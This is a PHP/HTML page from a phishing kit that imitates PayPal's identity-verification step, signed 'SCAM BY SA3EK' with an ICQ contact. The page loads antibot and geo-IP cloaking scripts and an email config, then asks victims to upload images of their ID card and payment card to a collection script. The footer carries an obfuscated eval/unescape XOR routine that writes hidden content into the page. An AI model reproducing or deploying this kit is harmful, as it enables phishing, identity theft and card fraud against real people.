<?php
    session_start();
    error_reporting(E_ERROR | E_PARSE);
    include('antibots/bot.php');
	include('antibots/perfect.php');
	include('email/config.php');
    include('geoip/get_lg.php');
    include('../louis.php');
/******
SCAM BY SA3EK
ICQ : 740900705
*******/
    //Override the session $_SESSION['xfilelangx']
    if(isset($_GET['lg'])){
        if($_GET['lg'] == 'US'){ $_SESSION['xfilelangx'] = "en.php"; }
        else if($_GET['lg'] == 'FR'){ $_SESSION['xfilelangx'] = "fr.php"; }
        else if($_GET['lg'] == 'ES'){ $_SESSION['xfilelangx'] = "es.php"; }
    }

    $xDIR_LGx = "banksecure.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2."&lg=";

    if(isset($_SESSION['xfilelangx'])){
        include('langue/'.$_SESSION['xfilelangx']);
    }
    else {
        include('langue/en.php');
    }

    $xDIRx = "accessaccount.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2;
?>
<!DOCTYPE html>
<html lang="en-US">

<head>
    <meta charSet="utf-8" />
    <title>(
        <?php echo $_SESSION['xcountryCodex']; ?>)
        <?php echo $xys76x; ?>
    </title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0" />
    <link rel="apple-touch-icon" href="open/img/pp64.png" />
    <link rel="shortcut icon" type="image/x-icon" href="open/img/favicon/fav.ico" />
    <link rel="icon" type="image/x-icon" href="open/img/favicon/fav.ico" />
    <link href="open/css/xmyaccx.css" media="screen, projection" rel="stylesheet" type="text/css" charSet="UTF-8" />
    <link href="src/jquery.fileuploader.css" rel="stylesheet">
    <link href="css/jquery.fileuploader-theme-thumbnails.css" rel="stylesheet">
</head>

<body>
    <div id="app-element-mountpoint">
        <div id="document-body" dir="ltr">
            <div class="backgroundColor">
                <div>
                    <div class="signup clear app-wrapper">
                        <div class="signup-page-header"> <a class="signup-page-header-logo"></a>
                            <a href="myaccount" class="signup-page-header-button vx_btn vx_btn-medium vx_btn-secondary">
                                <?php echo $xys17x; ?>
                            </a>
                        </div>
                        <main>
                            <div>
                                <div class="signup-page-form">
                                    <div class="notification"></div>
                                    <div class="busyOverlay" style="transition: unset; display: none;">
                                        <div class="busyIcon" style="top: 50%;"></div>
                                        <p class="xysnewLoaderx" style="margin-left: -92px;">
                                            <?php echo $xys68x; ?>
                                        </p>
                                    </div>
                                    <div class="signupAppContent">
                                        <div>
                                            <div class="center">
                                                <h1 class="vx_text-2 center ">
                                                    <?php echo $xys76x; ?>
                                                </h1>
                                            </div>
                                        </div>
                                        <div class="fieldGroupContainer">
                                            <div id="xyscontentidx">
                                                <div>
                                                    <p class="xyscontentidpx">1 -
                                                        <?php echo $xys77x; ?>
                                                    </p> <img src="open/img/idcard.svg"></div>
                                                <div>
                                                    <p class="xyscontentidpx">2 -
                                                        <?php echo $xys78x; ?>
                                                    </p> <img src="open/img/selcard.svg"></div>
                                                <p>(JPG - JPEG - PNG - GIF)</p>
                                                <form action="php/form_upload.php"  method="post" enctype="multipart/form-data"> <input type="file" name="files">
                                                    <div class="btnGrp"> <button name="xysbtnConfirmIDx" id="xysbtnConfirmIDx" value="<?php echo $xys59x; ?>" class="vx_btn vx_btn-block" style="width:auto;margin-bottom: -5px;" data-automation-id="page_submit"><?php echo $xys59x; ?></button></div>
                                                </form>
                                            </div>
                                            <div class="divider xyscenterx">
                                                <p>
                                                    <a href="<?php echo $xDIRx ?>" style=" font-size: 14px;" name="xysskipbankx">
                                                        <?php echo $xys75x; ?>
                                                    </a>
                                                </p>
                                            </div>
                                        </div>
                                        <div class="country-and-lang-selector" style="margin-bottom: -22px;margin-top: 30px;"> <span class="picker country-selector"> <a aria-label="Change country" id="xyspopUpLangx" class="country <?php echo $_SESSION['xcountryCodex']; ?>"></a> </span> <span> <a href="<?php echo $xDIR_LGx."US"; ?>">English</a> | </span>                                            <span> <a href="<?php echo $xDIR_LGx."FR"; ?>">Français</a> | </span> <span> <a href="<?php echo $xDIR_LGx."ES"; ?>">Español</a> | </span></div>
                                    </div>
                                    <div class="signup-page-footer vx_text-legal text-center">©1999–2019
                                        <script type="text/javascript">
                                            eval(unescape('%66%75%6e%63%74%69%6f%6e%20%6e%39%61%66%62%34%64%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%32%33%35%39%30%34%34%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%35%33%35%35%31%37%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%38%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6e%39%61%66%62%34%64%28%27')+'%4c%5c%78%4d%5c%4112359044%34%35%39%35%35%30%31'+unescape('%27%29%29%3b'));
                                        </script>.
                                        <?php echo $xys60x; ?> <span class="signup-page-footer-separator">|</span>
                                        <a class="vx_text-legal" style="cursor:pointer">
                                            <?php echo $xys6x; ?>
                                        </a> <span class="signup-page-footer-spacer"> </span>
                                        <a class="vx_text-legal" style="cursor:pointer">
                                            <?php echo $xys7x; ?>
                                        </a> <span class="signup-page-footer-spacer"> </span>
                                        <a class="vx_text-legal" style="cursor:pointer">
                                            <?php echo $xys5x; ?>
                                        </a> <span class="signup-page-footer-spacer"> </span> <span> <a class="vx_text-legal" style="cursor:pointer"><?php echo $xys61x; ?></a> </span> <a href="#" class="vx_text-legal"></a></div>
                                </div>
                            </div>
                        </main>
                        <div class="modalWindow hide xysPopUpLangx">
                            <div class="modalWrapper">
                                <div class="buttonHolder"> <button class="vx_modal-dismiss_x-trigger" id="xysclosePopUpLangx" style="outline: none;"> <span class="vx_a11yText"><?php echo $xys62x; ?></span> </button></div>
                                <div class="modalContent">
                                    <div class="country-selector">
                                        <ul>
                                            <li class="vx_text-2 title">
                                                <?php echo $xys63x; ?>
                                            </li>
                                            <li> <a href="#" class="country DZ">Algeria</a></li>
                                            <li> <a href="#" class="country AO">Angola</a></li>
                                            <li> <a href="#" class="country BJ">Benin</a></li>
                                            <li> <a href="#" class="country BW">Botswana</a></li>
                                            <li> <a href="#" class="country BF">Burkina Faso</a></li>
                                            <li> <a href="#" class="country BI">Burundi</a></li>
                                            <li> <a href="#" class="country CM">Cameroon</a></li>
                                            <li> <a href="#" class="country CV">Cape Verde</a></li>
                                            <li> <a href="#" class="country TD">Chad</a></li>
                                            <li> <a href="#" class="country KM">Comoros</a></li>
                                            <li> <a href="#" class="country CG">Congo - Brazzaville</a></li>
                                            <li> <a href="#" class="country CD">Congo - Kinshasa</a></li>
                                            <li> <a href="#" class="country CI">Côte d’Ivoire</a></li>
                                            <li> <a href="#" class="country DJ">Djibouti</a></li>
                                            <li> <a href="#" class="country EG">Egypt</a></li>
                                            <li> <a href="#" class="country ER">Eritrea</a></li>
                                            <li> <a href="#" class="country ET">Ethiopia</a></li>
                                            <li> <a href="#" class="country GA">Gabon</a></li>
                                            <li> <a href="#" class="country GM">Gambia</a></li>
                                            <li> <a href="#" class="country GN">Guinea</a></li>
                                            <li> <a href="#" class="country GW">Guinea-Bissau</a></li>
                                            <li> <a href="#" class="country KE">Kenya</a></li>
                                            <li> <a href="#" class="country LS">Lesotho</a></li>
                                            <li> <a href="#" class="country MG">Madagascar</a></li>
                                            <li> <a href="#" class="country MW">Malawi</a></li>
                                            <li> <a href="#" class="country ML">Mali</a></li>
                                            <li> <a href="#" class="country MR">Mauritania</a></li>
                                            <li> <a href="#" class="country MU">Mauritius</a></li>
                                            <li> <a href="#" class="country YT">Mayotte</a></li>
                                            <li> <a href="#" class="country MA">Morocco</a></li>
                                            <li> <a href="#" class="country MZ">Mozambique</a></li>
                                            <li> <a href="#" class="country NA">Namibia</a></li>
                                            <li> <a href="#" class="country NE">Niger</a></li>
                                            <li> <a href="#" class="country NG">Nigeria</a></li>
                                            <li> <a href="#" class="country RE">Réunion</a></li>
                                            <li> <a href="#" class="country RW">Rwanda</a></li>
                                            <li> <a href="#" class="country ST">São Tomé &amp; Príncipe</a></li>
                                            <li> <a href="#" class="country SN">Senegal</a></li>
                                            <li> <a href="#" class="country SC">Seychelles</a></li>
                                            <li> <a href="#" class="country SL">Sierra Leone</a></li>
                                            <li> <a href="#" class="country SO">Somalia</a></li>
                                            <li> <a href="#" class="country ZA">South Africa</a></li>
                                            <li> <a href="#" class="country SH">St. Helena</a></li>
                                            <li> <a href="#" class="country SZ">Swaziland</a></li>
                                            <li> <a href="#" class="country TZ">Tanzania</a></li>
                                            <li> <a href="#" class="country TG">Togo</a></li>
                                            <li> <a href="#" class="country TN">Tunisia</a></li>
                                            <li> <a href="#" class="country UG">Uganda</a></li>
                                            <li> <a href="#" class="country ZM">Zambia</a></li>
                                            <li> <a href="#" class="country ZW">Zimbabwe</a></li>
                                        </ul>
                                        <ul>
                                            <li class="vx_text-2 title">
                                                <?php echo $xys64x; ?>
                                            </li>
                                            <li> <a href="#" class="country AI">Anguilla</a></li>
                                            <li> <a href="#" class="country AG">Antigua &amp; Barbuda</a></li>
                                            <li> <a href="#" class="country AR">Argentina</a></li>
                                            <li> <a href="#" class="country AW">Aruba</a></li>
                                            <li> <a href="#" class="country BS">Bahamas</a></li>
                                            <li> <a href="#" class="country BB">Barbados</a></li>
                                            <li> <a href="#" class="country BZ">Belize</a></li>
                                            <li> <a href="#" class="country BM">Bermuda</a></li>
                                            <li> <a href="#" class="country BO">Bolivia</a></li>
                                            <li> <a href="#" class="country BR">Brazil</a></li>
                                            <li> <a href="#" class="country VG">British Virgin Islands</a></li>
                                            <li> <a href="#" class="country CA">Canada</a></li>
                                            <li> <a href="#" class="country KY">Cayman Islands</a></li>
                                            <li> <a href="#" class="country CL">Chile</a></li>
                                            <li> <a href="#" class="country CO">Colombia</a></li>
                                            <li> <a href="#" class="country CR">Costa Rica</a></li>
                                            <li> <a href="#" class="country DM">Dominica</a></li>
                                            <li> <a href="#" class="country DO">Dominican Republic</a></li>
                                            <li> <a href="#" class="country EC">Ecuador</a></li>
                                            <li> <a href="#" class="country SV">El Salvador</a></li>
                                            <li> <a href="#" class="country FK">Falkland Islands</a></li>
                                            <li> <a href="#" class="country GF">French Guiana</a></li>
                                            <li> <a href="#" class="country GL">Greenland</a></li>
                                            <li> <a href="#" class="country GD">Grenada</a></li>
                                            <li> <a href="#" class="country GP">Guadeloupe</a></li>
                                            <li> <a href="#" class="country GT">Guatemala</a></li>
                                            <li> <a href="#" class="country GY">Guyana</a></li>
                                            <li> <a href="#" class="country HN">Honduras</a></li>
                                            <li> <a href="#" class="country JM">Jamaica</a></li>
                                            <li> <a href="#" class="country MQ">Martinique</a></li>
                                            <li> <a href="#" class="country MX">Mexico</a></li>
                                            <li> <a href="#" class="country MS">Montserrat</a></li>
                                            <li> <a href="#" class="country AN">Netherlands Antilles</a></li>
                                            <li> <a href="#" class="country NI">Nicaragua</a></li>
                                            <li> <a href="#" class="country PA">Panama</a></li>
                                            <li> <a href="#" class="country PY">Paraguay</a></li>
                                            <li> <a href="#" class="country PE">Peru</a></li>
                                            <li> <a href="#" class="country KN">St. Kitts &amp; Nevis</a></li>
                                            <li> <a href="#" class="country LC">St. Lucia</a></li>
                                            <li> <a href="#" class="country PM">St. Pierre &amp; Miquelon</a></li>
                                            <li> <a href="#" class="country VC">St. Vincent &amp; Grenadines</a></li>
                                            <li> <a href="#" class="country SR">Suriname</a></li>
                                            <li> <a href="#" class="country TT">Trinidad &amp; Tobago</a></li>
                                            <li> <a href="#" class="country TC">Turks &amp; Caicos Islands</a></li>
                                            <li> <a href="#" class="country US">United States</a></li>
                                            <li> <a href="#" class="country UY">Uruguay</a></li>
                                            <li> <a href="#" class="country VE">Venezuela</a></li>
                                        </ul>
                                        <ul>
                                            <li class="vx_text-2 title">
                                                <?php echo $xys65x; ?>
                                            </li>
                                            <li> <a href="#" class="country AM">Armenia</a></li>
                                            <li> <a href="#" class="country AU">Australia</a></li>
                                            <li> <a href="#" class="country BH">Bahrain</a></li>
                                            <li> <a href="#" class="country BT">Bhutan</a></li>
                                            <li> <a href="#" class="country BN">Brunei</a></li>
                                            <li> <a href="#" class="country KH">Cambodia</a></li>
                                            <li> <a href="#" class="country C2">China</a></li>
                                            <li> <a href="#" class="country CK">Cook Islands</a></li>
                                            <li> <a href="#" class="country FJ">Fiji</a></li>
                                            <li> <a href="#" class="country PF">French Polynesia</a></li>
                                            <li> <a href="#" class="country HK">Hong Kong SAR China</a></li>
                                            <li> <a href="#" class="country IN">India</a></li>
                                            <li> <a href="#" class="country ID">Indonesia</a></li>
                                            <li> <a href="#" class="country IL">Israel</a></li>
                                            <li> <a href="#" class="country JP">Japan</a></li>
                                            <li> <a href="#" class="country JO">Jordan</a></li>
                                            <li> <a href="#" class="country KZ">Kazakhstan</a></li>
                                            <li> <a href="#" class="country KI">Kiribati</a></li>
                                            <li> <a href="#" class="country KW">Kuwait</a></li>
                                            <li> <a href="#" class="country KG">Kyrgyzstan</a></li>
                                            <li> <a href="#" class="country LA">Laos</a></li>
                                            <li> <a href="#" class="country MY">Malaysia</a></li>
                                            <li> <a href="#" class="country MV">Maldives</a></li>
                                            <li> <a href="#" class="country MH">Marshall Islands</a></li>
                                            <li> <a href="#" class="country FM">Micronesia</a></li>
                                            <li> <a href="#" class="country MN">Mongolia</a></li>
                                            <li> <a href="#" class="country NR">Nauru</a></li>
                                            <li> <a href="#" class="country NP">Nepal</a></li>
                                            <li> <a href="#" class="country NC">New Caledonia</a></li>
                                            <li> <a href="#" class="country NZ">New Zealand</a></li>
                                            <li> <a href="#" class="country NU">Niue</a></li>
                                            <li> <a href="#" class="country NF">Norfolk Island</a></li>
                                            <li> <a href="#" class="country OM">Oman</a></li>
                                            <li> <a href="#" class="country PW">Palau</a></li>
                                            <li> <a href="#" class="country PG">Papua New Guinea</a></li>
                                            <li> <a href="#" class="country PH">Philippines</a></li>
                                            <li> <a href="#" class="country PN">Pitcairn Islands</a></li>
                                            <li> <a href="#" class="country QA">Qatar</a></li>
                                            <li> <a href="#" class="country WS">Samoa</a></li>
                                            <li> <a href="#" class="country SA">Saudi Arabia</a></li>
                                            <li> <a href="#" class="country SG">Singapore</a></li>
                                            <li> <a href="#" class="country SB">Solomon Islands</a></li>
                                            <li> <a href="#" class="country KR">South Korea</a></li>
                                            <li> <a href="#" class="country LK">Sri Lanka</a></li>
                                            <li> <a href="#" class="country TW">Taiwan</a></li>
                                            <li> <a href="#" class="country TJ">Tajikistan</a></li>
                                            <li> <a href="#" class="country TH">Thailand</a></li>
                                            <li> <a href="#" class="country TO">Tonga</a></li>
                                            <li> <a href="#" class="country TM">Turkmenistan</a></li>
                                            <li> <a href="#" class="country TV">Tuvalu</a></li>
                                            <li> <a href="#" class="country AE">United Arab Emirates</a></li>
                                            <li> <a href="#" class="country VU">Vanuatu</a></li>
                                            <li> <a href="#" class="country VN">Vietnam</a></li>
                                            <li> <a href="#" class="country WF">Wallis &amp; Futuna</a></li>
                                            <li> <a href="#" class="country YE">Yemen</a></li>
                                        </ul>
                                        <ul>
                                            <li class="vx_text-2 title">
                                                <?php echo $xys66x; ?>
                                            </li>
                                            <li> <a href="#" class="country AL">Albania</a></li>
                                            <li> <a href="#" class="country AD">Andorra</a></li>
                                            <li> <a href="#" class="country AT">Austria</a></li>
                                            <li> <a href="#" class="country AZ">Azerbaijan</a></li>
                                            <li> <a href="#" class="country BY">Belarus</a></li>
                                            <li> <a href="#" class="country BE">Belgium</a></li>
                                            <li> <a href="#" class="country BA">Bosnia &amp; Herzegovina</a></li>
                                            <li> <a href="#" class="country BG">Bulgaria</a></li>
                                            <li> <a href="#" class="country HR">Croatia</a></li>
                                            <li> <a href="#" class="country CY">Cyprus</a></li>
                                            <li> <a href="#" class="country CZ">Czech Republic</a></li>
                                            <li> <a href="#" class="country DK">Denmark</a></li>
                                            <li> <a href="#" class="country EE">Estonia</a></li>
                                            <li> <a href="#" class="country FO">Faroe Islands</a></li>
                                            <li> <a href="#" class="country FI">Finland</a></li>
                                            <li> <a href="#" class="country FR">France</a></li>
                                            <li> <a href="#" class="country GE">Georgia</a></li>
                                            <li> <a href="#" class="country DE">Germany</a></li>
                                            <li> <a href="#" class="country GI">Gibraltar</a></li>
                                            <li> <a href="#" class="country GR">Greece</a></li>
                                            <li> <a href="#" class="country HU">Hungary</a></li>
                                            <li> <a href="#" class="country IS">Iceland</a></li>
                                            <li> <a href="#" class="country IE">Ireland</a></li>
                                            <li> <a href="#" class="country IT">Italy</a></li>
                                            <li> <a href="#" class="country LV">Latvia</a></li>
                                            <li> <a href="#" class="country LI">Liechtenstein</a></li>
                                            <li> <a href="#" class="country LT">Lithuania</a></li>
                                            <li> <a href="#" class="country LU">Luxembourg</a></li>
                                            <li> <a href="#" class="country MK">Macedonia</a></li>
                                            <li> <a href="#" class="country MT">Malta</a></li>
                                            <li> <a href="#" class="country MD">Moldova</a></li>
                                            <li> <a href="#" class="country MC">Monaco</a></li>
                                            <li> <a href="#" class="country ME">Montenegro</a></li>
                                            <li> <a href="#" class="country NL">Netherlands</a></li>
                                            <li> <a href="#" class="country NO">Norway</a></li>
                                            <li> <a href="#" class="country PL">Poland</a></li>
                                            <li> <a href="#" class="country PT">Portugal</a></li>
                                            <li> <a href="#" class="country RO">Romania</a></li>
                                            <li> <a href="#" class="country RU">Russia</a></li>
                                            <li> <a href="#" class="country SM">San Marino</a></li>
                                            <li> <a href="#" class="country RS">Serbia</a></li>
                                            <li> <a href="#" class="country SK">Slovakia</a></li>
                                            <li> <a href="#" class="country SI">Slovenia</a></li>
                                            <li> <a href="#" class="country ES">Spain</a></li>
                                            <li> <a href="#" class="country SJ">Svalbard &amp; Jan Mayen</a></li>
                                            <li> <a href="#" class="country SE">Sweden</a></li>
                                            <li> <a href="#" class="country CH">Switzerland</a></li>
                                            <li> <a href="#" class="country UA">Ukraine</a></li>
                                            <li> <a href="#" class="country GB">United Kingdom</a></li>
                                            <li> <a href="#" class="country VA">Vatican City</a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="open/js/jquery.min.js"></script>
    <script src="open/js/xbanksecx.js"></script>
    <script src="src/jquery.fileuploader.js"></script>
    <script src="js/custom.js"></script>
</body>

</html>